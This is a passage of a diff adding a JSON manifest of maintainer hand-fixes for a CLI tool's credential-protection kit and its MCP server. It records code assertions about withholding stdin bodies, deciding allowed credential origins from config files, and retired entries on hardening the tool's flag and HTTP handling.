+   "summary": "--stdin is a declared StdinFlag, so the kit holds a body whole and line by line before anything prints. cliutil.CompactStdinBody puts a JSON body on one line first, because a line of { alone collides with public text and refuses the start. feedback --stdin refuses instead of reporting a record the kit would withhold.",
+   "why": "A request body may carry a credential, and a held body is the kit's to judge. The cost is recorded in the docs: a preview of a --stdin body, and a vendor answer repeating part of it, are withheld, and the write still happens.",
+   "spec_encode_followup": "Press-side: generate StdinFlags and the compaction with the kit wiring.",
+   "asserts": [
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "StdinFlags: []string{\"--stdin\"},",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "cliutil.CompactStdinBody(args)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/credkit_hold.go",
+     "contains": "func CompactStdinBody(args []string) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/feedback.go",
+     "contains": "feedback --stdin cannot record a note",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/leak_test.go",
+     "contains": "func TestStdinBodyIsHeldBeforeAPreview(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "used-config-decides-origin",
+   "class": "credential-kit",
+   "status": "active",
+   "summary": "credentialFiles returns the config the program really uses first, because the kit takes the base URL and every allowed origin from the first file naming one: an explicit --config or ABNORMAL_CONFIG wins, the last --home decides the default paths, and every other file any flag could mean is only held. The credential stores are only held too: the store's base_url records where a token was issued, and config.Load takes no base URL from it. Startup reads --config and --home by their last occurrence; the root pre-run refuses a run whose parsed values differ (another flag swallowed one). abnormal-mcp, which has no such flags, refuses to start when startup read one.",
+   "why": "A discovered default's or a store's base_url must not become an allowed origin for a credential from another file.",
+   "spec_encode_followup": "Press-side: generate the file discovery in the wiring file.",
+   "asserts": [
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "func credentialFiles(args []string) []string {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "holdOnly(runFiles(cfg))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "cliutil.SetStartupFlags(explicit, home)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/credkit_hold.go",
+     "contains": "func CheckStartupFlags(config, home string) error {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "cliutil.CheckStartupFlags(flags.configPath, flags.homePath)",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/abnormal-mcp/main.go",
+     "contains": "if cliutil.StartupConfigFlag != \"\" || cliutil.StartupHomeFlag != \"\" {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/leak_test.go",
+     "contains": "func TestUsedConfigDecidesTheAllowedOrigin(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/leak_test.go",
+     "contains": "func TestCredentialStoreNamesNoOrigin(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/leak_test.go",
+     "contains": "func TestStartupFlagTheParserDidNotUseIsRefused(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/leak_test.go",
+     "contains": "func TestMCPRefusesAConfigFlagItDoesNotHave(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "agent-context-paths-forward-slash",
+   "class": "credential-kit",
+   "status": "active",
+   "summary": "agent-context prints the CLI's own config, data, state and cache directories through agentContextPath (internal/cli/abnormal_agent_paths.go): forward slashes on Windows, unchanged elsewhere.",
+   "why": "CI windows row on PR #554: a Windows path segment such as \\001 (every t.TempDir there) or \\2024 reads as an octal string escape, and with any credential held the kit runs out of decode budget on the whole 78 KB description and withholds it, so agent-context printed only the kit's notice. Windows accepts forward slashes. A reprint regenerates agent_context.go and would drop the call.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/agent_context.go",
+     "contains": "ConfigDir: agentContextPath(runtime.GOOS, configDir),",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/agent_context.go",
+     "contains": "CacheDir:  agentContextPath(runtime.GOOS, cacheDir),",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/abnormal_agent_paths.go",
+     "contains": "return strings.ReplaceAll(p, `\\`, \"/\")",
+     "code_only": true
+    }
+   ]
+  }
+ ],
+ "retired": [
+  {
+   "id": "mcp-filesystem-destination-gate",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Press 4.34.0 builds a per-command blocked set (blockedDestinationFlags, blockedInputFlags, root control-plane flags), removes those flags from each tool's schema, refuses any undeclared argument name (so \"db=/path\" is refused) and skips '=' names in cliArgsFromMCP."
+  },
+  {
+   "id": "mcp-argv-value-joined",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Upstreamed as cli-printing-press #4647: every value-carrying branch of cliArgsFromMCP joins the value to its flag (--k=v, one element per list item), and the press generates TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag."
+  },
+  {
+   "id": "interim-http-security-note-2026-10-22",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: The note paused HTTP mode until a reprint because the build served HTTP with no token. Press 4.34.0 HTTP mode refuses to start without <PREFIX>_MCP_HTTP_TOKEN, answers 401 without the right bearer, binds 127.0.0.1 by default and refuses a non-loopback address without TLS; onboard.py now writes HTTP guidance that follows the binary (cc-skills #14) and never writes this note, so the entry would fail on every re-onboard."
+  },
+  {
+   "id": "mcp-file-flags-refused",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Press 4.34.0's cobratree mirror derives one blocked set per command (destination, input, mcp:write-flags, mcp:read-flags and root control-plane flags), leaves those flags out of the tool schema and refuses them, and any undeclared argument, by name."
   }
  ]
 }
